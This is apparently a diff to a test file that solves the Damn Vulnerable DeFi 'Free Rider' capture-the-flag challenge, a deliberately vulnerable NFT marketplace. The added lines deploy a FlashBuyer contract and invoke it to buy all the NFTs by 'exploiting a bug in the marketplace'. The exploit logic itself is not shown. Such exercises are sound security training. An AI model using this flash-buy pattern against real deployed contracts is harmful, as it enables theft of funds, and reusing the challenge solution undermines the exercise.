@@ -4,6 +4,7 @@ pragma solidity ^0.8.0;
 import "@test/BaseTest.sol";
 import "@src/damn-vulnerable-defi/10-free-rider/FreeRiderNFTMarketplace.sol";
 import "@src/damn-vulnerable-defi/10-free-rider/FreeRiderRecovery.sol";
+import "@src/damn-vulnerable-defi/10-free-rider/FlashBuyer.sol";
 import "@src/damn-vulnerable-defi/DamnValuableToken.sol";
 import "@src/damn-vulnerable-defi/WETH9.sol";
 import "@src/damn-vulnerable-defi/09-puppet-v2/Interfaces.sol";
@@ -39,6 +40,7 @@ contract FreeRiderTest is BaseTest {
 
   function setUp() public override {
     /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
+    buyer = payable(makeAddr("buyer"));
     vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
     vm.deal(deployer, UNISWAP_INITIAL_WETH_RESERVE + MARKETPLACE_INITIAL_ETH_BALANCE);
     vm.deal(buyer, BUYER_PAYOUT);
@@ -115,7 +117,18 @@ contract FreeRiderTest is BaseTest {
 
   function testFreeRider() public {
     /** CODE YOUR SOLUTION HERE */
+    vm.startPrank(player, player);
+    sl.log("NFT Marketplace ETH balance: ", address(freeRiderNFTMarketplace).balance);
 
+    FlashBuyer fb = new FlashBuyer(
+      address(uniswapV2Pair),
+      payable(address(weth)),
+      payable(address(freeRiderNFTMarketplace)),
+      payable(address(freeRiderRecovery)),
+      player
+    );
+    // Buy all the NFT, exploiting a bug in the marketplace
+    fb.flashBuy{value: player.balance}();
 
     /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
     // Attacker must have earned all ETH from the payout
